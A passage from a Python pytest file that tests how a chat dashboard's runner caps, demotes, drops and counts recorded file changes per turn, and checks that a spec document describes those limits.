            turn.record(f"/f{index}.py", f"call-{index}-again", site=1)
        turn.flush(1)
        meta = slot.messages[-1]["meta"]
        assert [fc["path"] for fc in meta["file_changes"]] == ["/f2.py"]
        assert meta["file_changes_omitted_files"] == 2
        assert slot._dirty

    def test_the_count_is_absent_when_nothing_was_omitted(self, snapshot_turn):
        slot = _make_slot_with_assistant_message()
        turn = snapshot_turn(slot)
        turn.record("/a.py")
        turn.record("/b.py", site=1)
        turn.flush()
        meta = slot.messages[-1]["meta"]
        assert len(meta["file_changes"]) == 2
        assert "file_changes_omitted_files" not in meta

    def test_demoted_files_keep_their_path_and_are_not_counted(self, snapshot_turn, monkeypatch):
        # A demoted file stays on the message as a path, so it is not omitted.
        # The synthetic-message branch carries no zero count either.
        monkeypatch.setattr("kiro_crew.dashboard.chat_runner._MAX_TURN_SNAPSHOT_CHARS", 20)
        slot = _ChatSlot("stopped")
        turn = snapshot_turn(slot)
        for index in range(3):
            turn.record(f"/f{index}.py", f"call-{index}", content="x" * 50)
        turn.flush()
        meta = slot.messages[-1]["meta"]
        assert len(meta["file_changes"]) == 3
        assert sum(bool(fc.get("content_omitted")) for fc in meta["file_changes"]) == 2
        assert "file_changes_omitted_files" not in meta

    def test_the_count_is_dropped_files_only_beside_a_demoted_one(self, snapshot_turn, monkeypatch):
        # Room for one path beside the protected entry: /f1.py is demoted to its
        # path, /f0.py is dropped, and only the dropped one is counted.
        monkeypatch.setattr("kiro_crew.dashboard.chat_runner._MAX_TURN_SNAPSHOT_CHARS", 10)
        slot = _make_slot_with_assistant_message()
        turn = snapshot_turn(slot)
        for index in range(3):
            turn.record(f"/f{index}.py", f"call-{index}", content="x" * 50)
        turn.flush()
        meta = slot.messages[-1]["meta"]
        assert sorted(fc["path"] for fc in meta["file_changes"]) == ["/f1.py", "/f2.py"]
        assert meta["file_changes_omitted_files"] == 1

    def test_a_flush_without_drops_clears_an_earlier_count_on_its_message(self, monkeypatch):
        slot = _make_slot_with_assistant_message()
        monkeypatch.setattr("kiro_crew.dashboard.chat_runner._MAX_TURN_SNAPSHOT_ENTRIES", 1)
        for path in ("/a.py", "/b.py"):
            _record_turn_snapshot(slot, {"path": path, "content": "before"})
        _flush_file_changes(slot)
        assert slot.messages[-1]["meta"]["file_changes_omitted_files"] == 1
        _record_turn_snapshot(slot, {"path": "/c.py", "content": "before"})
        _flush_file_changes(slot)
        meta = slot.messages[-1]["meta"]
        assert [fc["path"] for fc in meta["file_changes"]] == ["/c.py"]
        assert "file_changes_omitted_files" not in meta

    def test_line_count_covers_the_latest_writes_past_the_row_cap(self, short_tmp_dir):
        slot = _make_slot_with_assistant_message()
        total = _MAX_TURN_SNAPSHOT_ENTRIES + 5
        for index in range(total):
            target = short_tmp_dir / f"f{index}.py"
            target.write_text("after\n")
            _record_turn_snapshot(slot, {"path": str(target), "content": "before\n"})
        # One removed and one added line per file, the latest five included.
        assert _turn_line_changes(slot._file_changes) == 2 * total
        latest = slot._file_changes[-5:]
        assert _turn_line_changes(latest) == 10

    def test_the_spec_describes_the_flush_side_cap_and_the_file_count(self):
        spec = (
            Path(__file__).parents[1] / "docs/system-specs/modules/learn-cron-dashboard.md"
        ).read_text(encoding="utf-8")
        paragraph = next(p for p in spec.split("\n\n") if p.startswith("The in-turn accumulator"))
        assert "every distinct path" in paragraph
        assert "file_changes_omitted_files" in paragraph
        assert "file_changes_omitted_writes" not in paragraph
        assert "_MAX_OMITTED_WRITES" not in paragraph
        assert "_TurnOverflowLines" not in paragraph
        snapshots = next(p for p in spec.split("\n\n") if p.startswith("**File-change snapshots**"))
        assert f"`_MAX_SNAPSHOT` ({_MAX_SNAPSHOT:,}) bounds one snapshot side" in snapshots
        assert (
            f"`_MAX_TURN_SNAPSHOT_CHARS` ({_MAX_TURN_SNAPSHOT_CHARS:,}) bounds the aggregate "
            "path+before+after characters outside the protected entry"
        ) in snapshots
        assert _MAX_TURN_SNAPSHOT_CHARS == 2 * _MAX_SNAPSHOT
        assert (
            "protects the most recent one whose content actually differs without charging it; "
            f"the total character bound is therefore {_MAX_TURN_SNAPSHOT_CHARS:,} plus that "
            "entry's two snapshot sides, truncation markers and path."
        ) in snapshots
